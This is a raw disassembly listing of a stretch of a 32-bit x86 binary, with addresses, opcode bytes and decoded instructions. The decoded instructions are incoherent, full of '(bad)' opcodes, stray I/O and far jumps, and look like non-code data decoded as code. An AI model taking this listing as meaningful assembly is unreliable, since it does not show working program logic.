  407499:	63 36                	arpl   %esi,(%esi)
  40749b:	60                   	pusha
  40749c:	3c 74                	cmp    $0x74,%al
  40749e:	c1 2c fe 1c          	shrl   $0x1c,(%esi,%edi,8)
  4074a2:	c2 15 7f             	ret    $0x7f15
  4074a5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4074a6:	b6 63                	mov    $0x63,%dh
  4074a8:	ed                   	in     (%dx),%eax
  4074a9:	b3 39                	mov    $0x39,%bl
  4074ab:	0a 22                	or     (%edx),%ah
  4074ad:	60                   	pusha
  4074ae:	8d 11                	lea    (%ecx),%edx
  4074b0:	31 49 1a             	xor    %ecx,0x1a(%ecx)
  4074b3:	21 23                	and    %esp,(%ebx)
  4074b5:	66 31 2c f2          	xor    %bp,(%edx,%esi,8)
  4074b9:	cd 4c                	int    $0x4c
  4074bb:	50                   	push   %eax
  4074bc:	3e 25 63 18 58 20    	ds and $0x20581863,%eax
  4074c2:	ea 18 f3 79 14 34 59 	ljmp   $0x5934,$0x1479f318
  4074c9:	11 f4                	adc    %esi,%esp
  4074cb:	4f                   	dec    %edi
  4074cc:	64 88 ee             	fs mov %ch,%dh
  4074cf:	fe                   	(bad)
  4074d0:	98                   	cwtl
  4074d1:	aa                   	stos   %al,%es:(%edi)
  4074d2:	23 e8                	and    %eax,%ebp
  4074d4:	04 f6                	add    $0xf6,%al
  4074d6:	cc                   	int3
  4074d7:	23 8f 3e f7 a6 f8    	and    -0x75908c2(%edi),%ecx
  4074dd:	4e                   	dec    %esi
  4074de:	d6                   	salc
  4074df:	20 7c 64 0a          	and    %bh,0xa(%esp,%eiz,2)
  4074e3:	f9                   	stc
  4074e4:	91                   	xchg   %eax,%ecx
  4074e5:	9a 2a 39 f5 63 20 f2 	lcall  $0xf220,$0x63f5392a
  4074ec:	a3 69 28 28 c7       	mov    %eax,0xc7282869
  4074f1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4074f2:	9b                   	fwait
  4074f3:	bc d8 fe 66 de       	mov    $0xde66fed8,%esp
  4074f8:	02 cd                	add    %ch,%cl
  4074fa:	3a d1                	cmp    %cl,%dl
  4074fc:	fa                   	cli
  4074fd:	1b d4                	sbb    %esp,%edx
  4074ff:	fa                   	cli
  407500:	10 2f                	adc    %ch,(%edi)
  407502:	44                   	inc    %esp
  407503:	9e                   	sahf
  407504:	46                   	inc    %esi
  407505:	e8 92 07 a7 b4       	call   0xb4e77c9c
  40750a:	a8 98                	test   $0x98,%al
  40750c:	fe                   	(bad)
  40750d:	d2 88 9e d0 98 b2    	rorb   %cl,-0x4d672f62(%eax)
  407513:	46                   	inc    %esi
  407514:	78 16                	js     0x40752c
  407516:	73 2b                	jae    0x407543
  407518:	e4 68                	in     $0x68,%al
  40751a:	3b c6                	cmp    %esi,%eax
  40751c:	e2 fc                	loop   0x40751a
  40751e:	58                   	pop    %eax
  40751f:	48                   	dec    %eax
  407520:	21 1c b2             	and    %ebx,(%edx,%esi,4)
  407523:	f1                   	int1
  407524:	38 fe                	cmp    %bh,%dh
  407526:	36 1a 7e 81          	sbb    %ss:-0x7f(%esi),%bh
  40752a:	b6 b2                	mov    $0xb2,%dh
  40752c:	0f b0 d8             	cmpxchg %bl,%al
  40752f:	77 c4                	ja     0x4074f5
  407531:	3c ed                	cmp    $0xed,%al
  407533:	79 65                	jns    0x40759a
  407535:	d1 67 f6             	shll   $1,-0xa(%edi)
  407538:	fc                   	cld
  407539:	0b 52 c8             	or     -0x38(%edx),%edx
  40753c:	1e                   	push   %ds
  40753d:	32 fd                	xor    %ch,%bh
  40753f:	2a 1b                	sub    (%ebx),%bl
  407541:	90                   	nop
  407542:	ef                   	out    %eax,(%dx)
  407543:	ea d6 2a 95 68 4b eb 	ljmp   $0xeb4b,$0x68952ad6
  40754a:	d5 98                	aad    $0x98
  40754c:	27                   	daa
  40754d:	88 24 70             	mov    %ah,(%eax,%esi,2)
  407550:	fa                   	cli
  407551:	11 9a 89 ae 49 02    	adc    %ebx,0x249ae89(%edx)
  407557:	dd 7e 27             	fnstsw 0x27(%esi)
  40755a:	65 f0 58             	gs lock pop %eax
  40755d:	01 20                	add    %esp,(%eax)
  40755f:	03 62 ce             	add    -0x32(%edx),%esp
  407562:	11 b5 ff 30 ef 23    	adc    %esi,0x23ef30ff(%ebp)
  407568:	cc                   	int3
  407569:	85 83 c4 4c 3c eb    	test   %eax,-0x14c3b33c(%ebx)
  40756f:	d1 3c 38             	sarl   $1,(%eax,%edi,1)
  407572:	48                   	dec    %eax
  407573:	3d 23 68 01 41       	cmp    $0x41016823,%eax
  407578:	f6 6b 80             	imulb  -0x80(%ebx)
  40757b:	e7 b0                	out    %eax,$0xb0
  40757d:	fc                   	cld
  40757e:	69 88 78 cd 8b 79 9e 	imul   $0x3858689e,0x798bcd78(%eax),%ecx
  407585:	68 58 38 
  407588:	49                   	dec    %ecx
  407589:	7d 1d                	jge    0x4075a8
  40758b:	e8 cd e7 25 0c       	call   0xc665d5d
  407590:	50                   	push   %eax
  407591:	7a a4                	jp     0x407537
  407593:	0a 3f                	or     (%edi),%bh
  407595:	95                   	xchg   %eax,%ebp
  407596:	79 e2                	jns    0x40757a
  407598:	bd 6c 1e a9 32       	mov    $0x32a91e6c,%ebp
  40759d:	3a d4                	cmp    %ah,%dl
  40759f:	4c                   	dec    %esp
  4075a0:	50                   	push   %eax
  4075a1:	ad                   	lods   %ds:(%esi),%eax
  4075a2:	81 56 43 40 50 df e2 	adcl   $0xe2df5040,0x43(%esi)
  4075a9:	2c d7                	sub    $0xd7,%al
  4075ab:	4c                   	dec    %esp
  4075ac:	23 55 f0             	and    -0x10(%ebp),%edx
  4075af:	31 30                	xor    %esi,(%eax)
  4075b1:	45                   	inc    %ebp
  4075b2:	7a dd                	jp     0x407591
  4075b4:	4f                   	dec    %edi
  4075b5:	7c 17                	jl     0x4075ce
  4075b7:	67 87 08             	xchg   %ecx,(%bx,%si)
  4075ba:	43                   	inc    %ebx
  4075bb:	78 70                	js     0x40762d
  4075bd:	77 f4                	ja     0x4075b3
  4075bf:	f5                   	cmc
  4075c0:	24 07                	and    $0x7,%al
  4075c2:	01 bb f3 af f3 24    	add    %edi,0x24f3aff3(%ebx)
  4075c8:	25 ce bf 8e 8e       	and    $0x8e8ebfce,%eax
  4075cd:	87 25 26 fe 75 1e    	xchg   %esp,0x1e75fe26
  4075d3:	ee                   	out    %al,(%dx)
  4075d4:	07                   	pop    %es
  4075d5:	02 26                	add    (%esi),%ah
  4075d7:	f2 d1 71 77          	repnz shll $1,0x77(%ecx)
  4075db:	27                   	daa
  4075dc:	87 27                	xchg   %esp,(%edi)
  4075de:	35 bc d6 fa 5c       	xor    $0x5cfad6bc,%eax
  4075e3:	bb 06 b2 e2 46       	mov    $0x46e2b206,%ebx
  4075e8:	6c                   	insb   (%dx),%es:(%edi)
  4075e9:	53                   	push   %ebx
  4075ea:	28 44 ff d2          	sub    %al,-0x2e(%edi,%edi,8)
  4075ee:	93                   	xchg   %eax,%ebx
  4075ef:	69 47 29 41 88 ce 29 	imul   $0x29ce8841,0x29(%edi),%eax
  4075f6:	48                   	dec    %eax
  4075f7:	72 c1                	jb     0x4075ba
  4075f9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075fa:	d4 aa                	aam    $0xaa
  4075fc:	98                   	cwtl
  4075fd:	28 53 45             	sub    %dl,0x45(%ebx)
  407600:	89 15 13 00 50 31    	mov    %edx,0x31500013
  407606:	44                   	inc    %esp
  407607:	68 4a 88 a9 68       	push   $0x68a9884a
  40760c:	41                   	inc    %ecx
  40760d:	5a                   	pop    %edx
  40760e:	88 67 3e             	mov    %ah,0x3e(%edi)
  407611:	23 70 5c             	and    0x5c(%eax),%esi
  407614:	9a db 36 46 6a 0b 73 	lcall  $0x730b,$0x6a4636db
  40761b:	2b 04 46             	sub    (%esi,%eax,2),%eax
  40761e:	b4 41                	mov    $0x41,%ah
  407620:	f5                   	cmc
  407621:	46                   	inc    %esi
  407622:	47                   	inc    %edi
  407623:	80 24 64 0e          	andb   $0xe,(%esp,%eiz,2)
  407627:	55                   	push   %ebp
  407628:	c9                   	leave
  407629:	5a                   	pop    %edx
  40762a:	c3                   	ret
  40762b:	5a                   	pop    %edx
  40762c:	d6                   	salc
  40762d:	42                   	inc    %edx
  40762e:	45                   	inc    %ebp
  40762f:	8d 4b 20             	lea    0x20(%ebx),%ecx
  407632:	38 0d 02 11 2d 03    	cmp    %cl,0x32d1102
  407638:	37                   	aaa
  407639:	4e                   	dec    %esi
  40763a:	6a 3f                	push   $0x3f
  40763c:	bd 9e 51 a5 a8       	mov    $0xa8a5519e,%ebp
  407641:	d2 ef                	shr    %cl,%bh
  407643:	49                   	dec    %ecx
  407644:	f7 2c e5 d7 50 ab 87 	imull  -0x7854af29(,%eiz,8)
  40764b:	4e                   	dec    %esi
  40764c:	b2 fb                	mov    $0xfb,%dl
  40764e:	9e                   	sahf
  40764f:	94                   	xchg   %eax,%esp
  407650:	ee                   	out    %al,(%dx)
  407651:	f4                   	hlt
  407652:	c9                   	leave
  407653:	0d d5 44 27 a0       	or     $0xa02744d5,%eax
  407658:	3c f1                	cmp    $0xf1,%al
  40765a:	70 c5                	jo     0x407621
  40765c:	e6 6a                	out    %al,$0x6a
  40765e:	8e 0b                	mov    (%ebx),%cs
  407660:	9f                   	lahf
  407661:	9f                   	lahf
  407662:	6d                   	insl   (%dx),%es:(%edi)
  407663:	23 76 00             	and    0x0(%esi),%esi
  407666:	fc                   	cld
  407667:	6e                   	outsb  %ds:(%esi),(%dx)
  407668:	d8 78 97             	fdivrs -0x69(%eax)
  40766b:	00 77 75             	add    %dh,0x75(%edi)
  40766e:	e7 e1                	out    %eax,$0xe1
  407670:	ee                   	out    %al,(%dx)
  407671:	1b 01                	sbb    (%ecx),%eax
  407673:	77 1d                	ja     0x407692
  407675:	1d 77 e7 78 9f       	sbb    $0x9f78e777,%eax
  40767a:	78 3c                	js     0x4076b8
  40767c:	dc 9d d7 79 23 02    	fcompl 0x22379d7(%ebp)
  407682:	79 e3                	jns    0x407667
  407684:	ee                   	out    %al,(%dx)
  407685:	bc ee 7a a7 ca       	mov    $0xcaa77aee,%esp
  40768a:	9f                   	lahf
  40768b:	ac                   	lods   %ds:(%esi),%al
  40768c:	a3 7a 6b 0e 4c       	mov    %eax,0x4c0e6b7a
  407691:	a8 bd                	test   $0xbd,%al
  407693:	cf                   	iret
  407694:	ae                   	scas   %es:(%edi),%al
  407695:	75 d2                	jne    0x407669
  407697:	68 ff a8 82 3a       	push   $0x3a82a8ff
  40769c:	7b 1e                	jnp    0x4076bc
  40769e:	28 10                	sub    %dl,(%eax)
  4076a0:	0b 30                	or     (%eax),%esi
  4076a2:	67 8b 30             	mov    (%bx,%si),%esi
  4076a5:	ff 46 58             	incl   0x58(%esi)
  4076a8:	9e                   	sahf
  4076a9:	e9 20 f0 8b d8       	jmp    0xd8cc66ce
  4076ae:	02 19                	add    (%ecx),%bl
  4076b0:	19 fc                	sbb    %edi,%esp
  4076b2:	22 8b 31 0b 6b fc    	and    -0x394f4cf(%ebx),%cl
  4076b8:	90                   	nop
  4076b9:	05 7c 72 a4 65       	add    $0x65a4727c,%eax
  4076be:	24 a0                	and    $0xa0,%al
  4076c0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4076c1:	1c e3                	sbb    $0xe3,%al
  4076c3:	e2 fe                	loop   0x4076c3
  4076c5:	7e 44                	jle    0x40770b
  4076c7:	12 67 a3             	adc    -0x5d(%edi),%ah
  4076ca:	b6 8c                	mov    $0x8c,%dh
  4076cc:	4b                   	dec    %ebx
  4076cd:	95                   	xchg   %eax,%ebp
  4076ce:	fb                   	sti
  4076cf:	9a 32 2d b5 cf 62 ba 	lcall  $0xba62,$0xcfb52d32
  4076d6:	ef                   	out    %eax,(%dx)
  4076d7:	29 1f                	sub    %ebx,(%edi)
  4076d9:	55                   	push   %ebp
  4076da:	75 f7                	jne    0x4076d3
  4076dc:	81 9a 21 7b de 2d f9 	sbbl   $0x2c694bf9,0x2dde7b21(%edx)
  4076e3:	4b 69 2c 
  4076e6:	2e 40                	cs inc %eax
  4076e8:	4a                   	dec    %edx
  4076e9:	fe                   	(bad)
  4076ea:	f9                   	stc
  4076eb:	f9                   	stc
  4076ec:	44                   	inc    %esp
  4076ed:	10 40 fb             	adc    %al,-0x5(%eax)
  4076f0:	f1                   	int1
  4076f1:	51                   	push   %ecx
  4076f2:	c0 62 3c f2          	shlb   $0xf2,0x3c(%edx)
  4076f6:	62 4e 64             	bound  %ecx,0x64(%esi)
  4076f9:	2f                   	das
  4076fa:	40                   	inc    %eax
  4076fb:	8f 02                	pop    (%edx)
  4076fd:	3c 1b                	cmp    $0x1b,%al
  4076ff:	3e 3c d5             	ds cmp $0xd5,%al
  407702:	69 87 95 82 ed 78 5d 	imul   $0x5e2645d,0x78ed8295(%edi),%eax
  407709:	64 e2 05 
  40770c:	a2 d1 4b 7e c2       	mov    %al,0xc27e4bd1
  407711:	58                   	pop    %eax
  407712:	04 32                	add    $0x32,%al
  407714:	ea 27 95 20 f9 67 ce 	ljmp   $0xce67,$0xf9209527
  40771b:	52                   	push   %edx
  40771c:	12 40 a2             	adc    -0x5e(%eax),%al
  40771f:	24 4f                	and    $0x4f,%al
  407721:	55                   	push   %ebp
  407722:	c4 70 1f             	les    0x1f(%eax),%esi
  407725:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407726:	70 01                	jo     0x407729
  407728:	c6                   	(bad)
  407729:	3f                   	aas
  40772a:	ad                   	lods   %ds:(%esi),%eax
  40772b:	3c 3d                	cmp    $0x3d,%al
  40772d:	2d e5 9a b6 94       	sub    $0x94b69ae5,%eax
  407732:	d6                   	salc
  407733:	e5 40                	in     $0x40,%eax
  407735:	f9                   	stc
  407736:	26 35 df 41 16 36    	es xor $0x361641df,%eax
  40773c:	85 68 1b             	test   %ebp,0x1b(%eax)
  40773f:	5a                   	pop    %edx
  407740:	fe 4d 01             	decb   0x1(%ebp)
  407743:	68 f1 4d 6a 02       	push   $0x26a4df1
  407748:	c5 37                	lds    (%edi),%esi
  40774a:	a9 6d 03 b5 8f       	test   $0x8fb5036d,%eax
  40774f:	b3 a1                	mov    $0xa1,%bl
  407751:	1c 04                	sbb    $0x4,%al
  407753:	b5 a1                	mov    $0xa1,%ch
  407755:	85 64 f5 05          	test   %esp,0x5(%ebp,%esi,8)
  407759:	b5 a1                	mov    $0xa1,%ch
  40775b:	85 6b f5             	test   %ebp,-0xb(%ebx)
  40775e:	06                   	push   %es
  40775f:	b5 a1                	mov    $0xa1,%ch
  407761:	85 71 f5             	test   %esi,-0xb(%ecx)
  407764:	07                   	pop    %es
  407765:	b5 a1                	mov    $0xa1,%ch
  407767:	05 76 f5 08 d9       	add    $0xd908f576,%eax
  40776c:	d0 c2                	rol    $1,%dl
  40776e:	32 f5                	xor    %ch,%dh
  407770:	09 22                	or     %esp,(%edx)
  407772:	d9 c7                	fld    %st(7)
  407774:	d9 c7                	fld    %st(7)
  407776:	0a 23                	or     (%ebx),%ah
  407778:	0b 24 80             	or     (%eax,%eax,4),%esp
  40777b:	0f da c7             	pminub %mm7,%mm0
  40777e:	0c f5                	or     $0xf5,%al
  407780:	0d f6 71 36 b4       	or     $0xb43671f6,%eax
  407785:	26 0e                	es push %cs
  407787:	30 cf                	xor    %cl,%bh
  407789:	f6 71 27             	divb   0x27(%ecx)
  40778c:	0f f5 10             	pmaddwd (%eax),%mm2
  40778f:	f6 71 36             	divb   0x36(%ecx)
  407792:	b4 29                	mov    $0x29,%ah
  407794:	11 f6                	adc    %esi,%esi
  407796:	71 f6                	jno    0x40778e
  407798:	71 2a                	jno    0x4077c4
  40779a:	12 2b                	adc    (%ebx),%ch
  40779c:	13 f6                	adc    %esi,%esi
  40779e:	71 f6                	jno    0x407796
  4077a0:	71 2c                	jno    0x4077ce
  4077a2:	14 2d                	adc    $0x2d,%al
  4077a4:	15 f6 71 f6 71       	adc    $0x71f671f6,%eax
  4077a9:	2e 16                	cs push %ss
  4077ab:	2f                   	das
  4077ac:	17                   	pop    %ss
  4077ad:	f6 71 f6             	divb   -0xa(%ecx)
  4077b0:	71 30                	jno    0x4077e2
  4077b2:	18 31                	sbb    %dh,(%ecx)
  4077b4:	19 67 c7             	sbb    %esp,-0x39(%edi)
  4077b7:	e5 43                	in     $0x43,%eax
  4077b9:	32 84 33 76 dc d9 71 	xor    0x71d9dc76(%ebx,%esi,1),%al
  4077c0:	84 03                	test   %al,(%ebx)
  4077c2:	84 c7                	test   %al,%bh
  4077c4:	9d                   	popf
  4077c5:	1d 77 34 84 35       	sbb    $0x35843477,%eax
  4077ca:	84 dc                	test   %bl,%ah
  4077cc:	d9 71 67             	fnstenv 0x67(%ecx)
  4077cf:	36 84 37             	test   %dh,%ss:(%edi)
  4077d2:	9d                   	popf
  4077d3:	1d 77 76 84 38       	sbb    $0x38847677,%eax
  4077d8:	84 39                	test   %bh,(%ecx)
  4077da:	d9 71 67             	fnstenv 0x67(%ecx)
  4077dd:	c7 84 3a 84 3b 1d 77 	movl   $0x3c84dc76,0x771d3b84(%edx,%edi,1)
  4077e4:	76 dc 84 3c 
  4077e8:	84 71 67             	test   %dh,0x67(%ecx)
  4077eb:	c7                   	(bad)
  4077ec:	9d                   	popf
  4077ed:	3d 84 3e 84 6a       	cmp    $0x6a843e84,%eax
  4077f2:	78 dc                	js     0x4077d0
  4077f4:	d9 3f                	fnstcw (%edi)
  4077f6:	84 24 0b             	test   %ah,(%ebx,%ecx,1)
  4077f9:	40                   	inc    %eax
  4077fa:	ab                   	stos   %eax,%es:(%edi)
  4077fb:	10 47 13             	adc    %al,0x13(%edi)
  4077fe:	14 b7                	adc    $0xb7,%al
  407800:	8a 21                	mov    (%ecx),%ah
  407802:	1d ce ad 80 72       	sbb    $0x7280adce,%eax
  407807:	38 66 0c             	cmp    %ah,0xc(%esi)
  40780a:	fa                   	cli
  40780b:	41                   	inc    %ecx
  40780c:	84 3b                	test   %bh,(%ebx)
  40780e:	3b ee                	cmp    %esi,%ebp
  407810:	ec                   	in     (%dx),%al
  407811:	42                   	inc    %edx
  407812:	84 43 b3             	test   %al,-0x4d(%ebx)
  407815:	e3 ce                	jecxz  0x4077e5
  407817:	8e 84 44 84 45 3b ee 	mov    -0x11c4ba7c(%esp,%eax,2),%es
  40781e:	ec                   	in     (%dx),%al
  40781f:	b8 84 46 84 e3       	mov    $0xe3844684,%eax
  407824:	ce                   	into
  407825:	8e 3b                	mov    (%ebx),%?
  407827:	47                   	inc    %edi
  407828:	84 48 84             	test   %cl,-0x7c(%eax)
  40782b:	ee                   	out    %al,(%dx)
  40782c:	ec                   	in     (%dx),%al
  40782d:	b8 b3 49 84 4a       	mov    $0x4a8449b3,%eax
  407832:	38 fb                	cmp    %bh,%bl
  407834:	38 3b                	cmp    %bh,(%ebx)
  407836:	84 4b 1a             	test   %cl,0x1a(%ebx)
  407839:	4c                   	dec    %esp
  40783a:	1b 07                	sbb    (%edi),%eax
  40783c:	cc                   	int3
  40783d:	38 fb                	cmp    %bh,%bl
  40783f:	4d                   	dec    %ebp
  407840:	1c 71                	sbb    $0x71,%al
  407842:	74 c7                	je     0x40780b
  407844:	67 16                	addr16 push %ss
  407846:	1d 4e 1e 66 1f       	sbb    $0x1f661e4e,%eax
  40784b:	25 de 00 13 10       	and    $0x101300de,%eax
  407850:	dd ae 91 fc 03 a8    	(bad) -0x57fc036f(%esi)
  407856:	3b 17                	cmp    (%edi),%edx
  407858:	a9 74 3c 0e 60       	test   $0x600e3c74,%eax
  40785d:	ef                   	out    %eax,(%dx)
  40785e:	12 69 b1             	adc    -0x4f(%ecx),%ch
  407861:	44                   	inc    %esp
  407862:	04 44                	add    $0x44,%al
  407864:	39 6e f7             	cmp    %ebp,-0x9(%esi)
  407867:	c7 40 2c 7a 1c 28 92 	movl   $0x92281c7a,0x2c(%eax)
  40786e:	6c                   	insb   (%dx),%es:(%edi)
  40786f:	4b                   	dec    %ebx
  407870:	46                   	inc    %esi
  407871:	25 b6 e5 e7 38       	and    $0x38e7e5b6,%eax
  407876:	05 64 ce 3a ab       	add    $0xab3ace64,%eax
  40787b:	b3 01                	mov    $0x1,%bl
  40787d:	60                   	pusha
  40787e:	02 58 72             	add    0x72(%eax),%bl
  407881:	ec                   	in     (%dx),%al
  407882:	ac                   	lods   %ds:(%esi),%al
  407883:	5c                   	pop    %esp
  407884:	0b 3a                	or     (%edx),%edi
  407886:	62 32                	bound  %esi,(%edx)
  407888:	e3 82                	jecxz  0x40780c
  40788a:	fd                   	std
  40788b:	86 bb 80 2d 18 44    	xchg   %bh,0x44182d80(%ebx)
  407891:	9e                   	sahf
  407892:	b4 54                	mov    $0x54,%ah
  407894:	18 38                	sbb    %bh,(%eax)
  407896:	57                   	push   %edi
  407897:	48                   	dec    %eax
  407898:	c9                   	leave
  407899:	14 48                	adc    $0x48,%al
  40789b:	41                   	inc    %ecx
  40789c:	d9 92 23 08 ff f2    	fsts   -0xd00f7dd(%edx)
  4078a2:	c4 33                	les    (%ebx),%esi
  4078a4:	3d 10 ae 78 9a       	cmp    $0x9a78ae10,%eax
  4078a9:	26 c3                	es ret
  4078ab:	47                   	inc    %edi
  4078ac:	ca c0 2a             	lret   $0x2ac0
  4078af:	d1 11                	rcll   $1,(%ecx)
  4078b1:	ba 62 0c 00 ff       	mov    $0xff000c62,%edx
  4078b6:	29 6e a2             	sub    %ebp,-0x5e(%esi)
  4078b9:	ba e6 47 3f 6a       	mov    $0x6a3f47e6,%edx
  4078be:	a9 1e 09 b1 9a       	test   $0x9ab1091e,%eax
  4078c3:	fe 09                	decb   (%ecx)
  4078c5:	10 8e ef 84 09 0e    	adc    %cl,0xe0984ef(%esi)
  4078cb:	aa                   	stos   %al,%es:(%edi)
  4078cc:	3b 3e                	cmp    (%esi),%edi
  4078ce:	ee                   	out    %al,(%dx)
  4078cf:	8a 0e                	mov    (%esi),%cl
  4078d1:	77 76                	ja     0x407949
  4078d3:	b8 3b 0f 0d 02       	mov    $0x20d0f3b,%eax
  4078d8:	0f f1 71 77          	psllw  0x77(%ecx),%mm6
  4078dc:	54                   	push   %esp
  4078dd:	10 90 10 c3 dd 51    	adc    %dl,0x51ddc310(%eax)
  4078e3:	dd 11                	fstl   (%ecx)
  4078e5:	13 03                	adc    (%ebx),%eax
  4078e7:	eb 7e                	jmp    0x407967
  4078e9:	e2 b3                	loop   0x40789e
  4078eb:	11 8b 11 d2 7a 5e    	adc    %ecx,0x5e7ad211(%ebx)
  4078f1:	96                   	xchg   %eax,%esi
  4078f2:	f2 0d da 61 e0 fe    	repnz or $0xfee061da,%eax
  4078f8:	04 25                	add    $0x25,%al
  4078fa:	9d                   	popf
  4078fb:	34 12                	xor    $0x12,%al
  4078fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4078fe:	38 0b                	cmp    %cl,(%ebx)
  407900:	6f                   	outsl  %ds:(%esi),(%dx)
  407901:	fd                   	std
  407902:	ff 4c a2 26          	decl   0x26(%edx,%eiz,4)
  407906:	d7                   	xlat   %ds:(%ebx)
  407907:	e4 8c                	in     $0x8c,%al
  407909:	d0 d8                	rcr    $1,%al
  40790b:	04 1c                	add    $0x1c,%al
  40790d:	64 00 93 ed 0a 1d 34 	add    %dl,%fs:0x341d0aed(%ebx)
  407914:	3d 07 b3 44 8e       	cmp    $0x8e44b307,%eax
  407919:	32 84 61 29 0f 00 4f 	xor    0x4f000f29(%ecx,%eiz,2),%al
  407920:	c4 83 dc 4c dd 32    	les    0x32dd4cdc(%ebx),%eax
  407926:	36 a5                	movsl  %ss:(%esi),%es:(%edi)
  407928:	33 8d ed 9e 0b 0b    	xor    0xb0b9eed(%ebp),%ecx
  40792e:	0c 19                	or     $0x19,%al
  407930:	11 11                	adc    %edx,(%ecx)
  407932:	46                   	inc    %esi
  407933:	3a 90 4b 8e 92 c2    	cmp    -0x3d6d71b5(%eax),%dl
  407939:	8e d7                	mov    %edi,%ss
  40793b:	11 c0                	adc    %eax,%eax
  40793d:	fe                   	(bad)
  40793e:	14 30                	adc    $0x30,%al
  407940:	2f                   	das
  407941:	14 21                	adc    $0x21,%al
  407943:	ad                   	lods   %ds:(%esi),%eax
  407944:	1c 24                	sbb    $0x24,%al
  407946:	e1 4d                	loope  0x407995
  407948:	7c 19                	jl     0x407963
  40794a:	1c 93                	sbb    $0x93,%al
  40794c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40794d:	bc f3 3a 1b 5c       	mov    $0x5c1b3af3,%esp
  407952:	0b 44 e4 7d          	or     0x7d(%esp,%eiz,8),%eax
  407956:	ed                   	in     (%dx),%eax
  407957:	3c f7                	cmp    $0xf7,%al
  407959:	35 78 15 a0 da       	xor    $0xdaa01578,%eax
  40795e:	79 ef                	jns    0x40794f
  407960:	8e 0e                	mov    (%esi),%cs
  407962:	d6                   	salc
  407963:	9b                   	fwait
  407964:	3b 22                	cmp    (%edx),%esp
  407966:	07                   	pop    %es
  407967:	12 5b 21             	adc    0x21(%ebx),%bl
  40796a:	a0 0a ad 34 c4       	mov    0xc434ad0a,%al
  40796f:	fc                   	cld
  407970:	54                   	push   %esp
  407971:	be c9 66 9a 0d       	mov    $0xd9a66c9,%esi
  407976:	82 76 de 12          	xorb   $0x12,-0x22(%esi)
  40797a:	ad                   	lods   %ds:(%esi),%eax
  40797b:	1b 71 94             	sbb    -0x6c(%ecx),%esi
  40797e:	5c                   	pop    %esp
  40797f:	04 85                	add    $0x85,%al
  407981:	9a 85 3b 94 4a 99 44 	lcall  $0x4499,$0x4a943b85
  407988:	60                   	pusha
  407989:	2e 8a 60 35          	mov    %cs:0x35(%eax),%ah
  40798d:	07                   	pop    %es
  40798e:	08 99 fa d3 90 2f    	or     %bl,0x2f90d3fa(%ecx)
  407994:	74 db                	je     0x407971
  407996:	a8 34                	test   $0x34,%al
  407998:	e5 31                	in     $0x31,%eax
  40799a:	18 74 80 0a          	sbb    %dh,0xa(%eax,%eax,4)
  40799e:	17                   	pop    %ss
  40799f:	3c c8                	cmp    $0xc8,%al
  4079a1:	2e 7a 9b             	jp,pn  0x40793f
  4079a4:	fc                   	cld
  4079a5:	b2 5c                	mov    $0x5c,%dl
  4079a7:	34 67                	xor    $0x67,%al
  4079a9:	58                   	pop    %eax
  4079aa:	00 43 60             	add    %al,0x60(%ebx)
  4079ad:	a3 63 46 ea 5c       	mov    %eax,0x5cea4663
  4079b2:	34 da                	xor    $0xda,%al
  4079b4:	bc 58 7e e5 2f       	mov    $0x2fe57e58,%esp
  4079b9:	96                   	xchg   %eax,%esi
  4079ba:	06                   	push   %es
  4079bb:	18 52 68             	sbb    %dl,0x68(%edx)
  4079be:	f4                   	hlt
  4079bf:	3b 3a                	cmp    (%edx),%edi
  4079c1:	fd                   	std
  4079c2:	45                   	inc    %ebp
  4079c3:	38 18                	cmp    %bl,(%eax)
  4079c5:	0c 46                	or     $0x46,%al
  4079c7:	56                   	push   %esi
  4079c8:	43                   	inc    %ebx
  4079c9:	3d 5c 14 bb 1b       	cmp    $0x1bbb145c,%eax
  4079ce:	31 7d 65             	xor    %edi,0x65(%ebp)
  4079d1:	43                   	inc    %ebx
  4079d2:	96                   	xchg   %eax,%esi
  4079d3:	20 1a                	and    %bl,(%edx)
  4079d5:	2b 51 a3             	sub    -0x5d(%ecx),%edx
  4079d8:	57                   	push   %edi
  4079d9:	91                   	xchg   %eax,%ecx
  4079da:	38 17                	cmp    %dl,(%edi)
  4079dc:	7d dc                	jge    0x4079ba
  4079de:	05 56 99 7e 16       	add    $0x167e9956,%eax
  4079e3:	8e 21                	mov    (%ecx),%fs
  4079e5:	99                   	cltd
  4079e6:	5b                   	pop    %ebx
  4079e7:	84 cc                	test   %cl,%ah
  4079e9:	4b                   	dec    %ebx
  4079ea:	99                   	cltd
  4079eb:	5f                   	pop    %edi
  4079ec:	ca 3c 8d             	lret   $0x8d3c
  4079ef:	04 e5                	add    $0xe5,%al
  4079f1:	b4 6c                	mov    $0x6c,%ah
  4079f3:	1c 44                	sbb    $0x44,%al
  4079f5:	1a c2                	sbb    %dl,%al
  4079f7:	3d 1e 14 1c 16       	cmp    $0x161c141e,%eax
  4079fc:	ef                   	out    %eax,(%dx)
  4079fd:	23 08                	and    (%eax),%ecx
  4079ff:	04 8f                	add    $0x8f,%al
  407a01:	91                   	xchg   %eax,%ecx
  407a02:	c8 f3 00 18          	enter  $0xf3,$0x18
  407a06:	dc f3                	fdiv   %st,%st(3)
  407a08:	48                   	dec    %eax
  407a09:	8c 4c dc 59          	mov    %cs,0x59(%esp,%ebx,8)
  407a0d:	cf                   	iret
  407a0e:	a8 0b                	test   $0xb,%al
  407a10:	18 3a                	sbb    %bh,(%edx)
  407a12:	77 76                	ja     0x407a8a
  407a14:	a0 77 78 1b 3a       	mov    0x3a1b7877,%al
  407a19:	d5 c0                	aad    $0xc0
  407a1b:	86 4e 35             	xchg   %cl,0x35(%esi)
  407a1e:	30 79 ba             	xor    %bh,-0x46(%ecx)
  407a21:	55                   	push   %ebp
  407a22:	0d cc 7a 19 39       	or     $0x39197acc,%eax
  407a27:	a0 08 24 78 94       	mov    0x94782408,%al
  407a2c:	89 1c 8f             	mov    %ebx,(%edi,%ecx,4)
  407a2f:	75 2a                	jne    0x407a5b
  407a31:	0b 5c d0 3b          	or     0x3b(%eax,%edx,8),%ebx
  407a35:	ee                   	out    %al,(%dx)
  407a36:	9c                   	pushf
  407a37:	68 82 d0 e3 ce       	push   $0xcee3d082
  407a3c:	8e 3b                	mov    (%ebx),%?
  407a3e:	83 d0 84             	adc    $0xffffff84,%eax
  407a41:	d0 c5                	rol    $1,%ch
